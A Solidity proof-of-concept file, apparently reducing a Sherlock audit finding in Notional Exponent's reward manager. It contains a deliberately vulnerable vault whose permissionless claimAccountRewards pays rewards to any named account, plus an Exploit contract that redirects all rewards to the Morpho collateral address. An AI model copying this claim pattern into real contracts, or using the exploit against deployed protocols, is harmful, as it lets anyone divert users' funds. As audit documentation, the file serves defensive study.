// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Notional Exponent — RewardManagerMixin.claimAccountRewards lacks account
    checks; MORPHO can be passed and steals rewards (Sherlock 2025-06, #62488)

    SYNTHETIC, cheatcode-free reduction.

    Root cause: claimAccountRewards(account, sharesHeld) is permissionless. If
    the caller is not a lending router it overwrites sharesHeld with
    balanceOf(account). After enterPosition, vault shares sit on the MORPHO
    address (collateral), so calling claimAccountRewards(MORPHO) pays Morpho
    the bulk of emissions/rewards that belong to the real user.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract AddressRegistry {
    mapping(address => bool) public isLendingRouter;

    function setLendingRouter(address r, bool v) external {
        isLendingRouter[r] = v;
    }
}

/// @notice Reduced vault + RewardManagerMixin.
contract RewardVault {
    MockERC20 public immutable rewardToken;
    AddressRegistry public immutable ADDRESS_REGISTRY;
    address public immutable MORPHO;

    mapping(address => uint256) public balanceOf; // vault shares
    uint256 public totalSupply;
    uint256 public rewardPool; // claimable reward tokens held by vault

    // per-share reward index (simplified: claim pays rewardPool * shares / totalSupply)
    mapping(address => uint256) public claimed;

    bool private locked;

    modifier nonReentrant() {
        require(!locked, "reentrant");
        locked = true;
        _;
        locked = false;
    }

    constructor(MockERC20 _rt, AddressRegistry _reg, address _morpho) {
        rewardToken = _rt;
        ADDRESS_REGISTRY = _reg;
        MORPHO = _morpho;
    }

    function effectiveSupply() public view returns (uint256) {
        return totalSupply == 0 ? 1 : totalSupply;
    }

    /// @notice enterPosition: mint vault shares to MORPHO (collateral holder).
    function enterPosition(address /*user*/, uint256 shares) external {
        // In production shares are minted then transferred to Morpho as collateral.
        balanceOf[MORPHO] += shares;
        totalSupply += shares;
    }

    function fundRewards(uint256 amt) external {
        rewardToken.transferFrom(msg.sender, address(this), amt);
        rewardPool += amt;
    }

    /// @notice Vulnerable claim — no check that `account` is a real user / not MORPHO.
    function claimAccountRewards(address account, uint256 sharesHeld)
        external
        nonReentrant
        returns (uint256 rewards)
    {
        uint256 effectiveSupplyBefore = effectiveSupply();
        if (!ADDRESS_REGISTRY.isLendingRouter(msg.sender)) {
            // If the caller is not a lending router we get the shares held in a
            // native token account. FIX: require(account == msg.sender) or reject MORPHO.
            sharesHeld = balanceOf[account]; // @> VULN: any account, including MORPHO
        }
        effectiveSupplyBefore; // silence
        if (sharesHeld == 0 || totalSupply == 0) return 0;
        rewards = (rewardPool * sharesHeld) / totalSupply;
        if (rewards > rewardPool) rewards = rewardPool;
        rewardPool -= rewards;
        // Pays `account` — so MORPHO receives the tokens when account==MORPHO
        rewardToken.transfer(account, rewards);
        claimed[account] += rewards;
    }
}

contract Exploit {
    MockERC20 public rewardToken; // 1
    AddressRegistry public registry; // 2
    RewardVault public vault; // 3 vulnerable
    address public constant MORPHO = address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    uint256 public constant USER_SHARES = 1000e18;
    uint256 public constant REWARDS = 100e18;

    constructor() {
        rewardToken = new MockERC20("Reward", "RWD");
        registry = new AddressRegistry();
        vault = new RewardVault(rewardToken, registry, MORPHO);

        // Simulate enterPosition: vault shares sit on MORPHO
        vault.enterPosition(address(this), USER_SHARES);

        // Accrue rewards
        rewardToken.mint(address(this), REWARDS);
        rewardToken.approve(address(vault), REWARDS);
        vault.fundRewards(REWARDS);
    }

    function run() external {
        require(vault.balanceOf(MORPHO) == USER_SHARES, "morpho holds shares");
        require(rewardToken.balanceOf(MORPHO) == 0, "morpho starts empty");

        // Permissionless claim with account = MORPHO (not a lending router)
        // @> anyone can redirect rewards to Morpho
        vault.claimAccountRewards(MORPHO, type(uint256).max);

        // HARM: Morpho received essentially all rewards; real user got nothing
        require(rewardToken.balanceOf(MORPHO) == REWARDS, "morpho stole rewards");
        require(rewardToken.balanceOf(address(this)) == 0, "user got none");
        require(vault.claimed(MORPHO) == REWARDS, "claimed to morpho");
    }
}
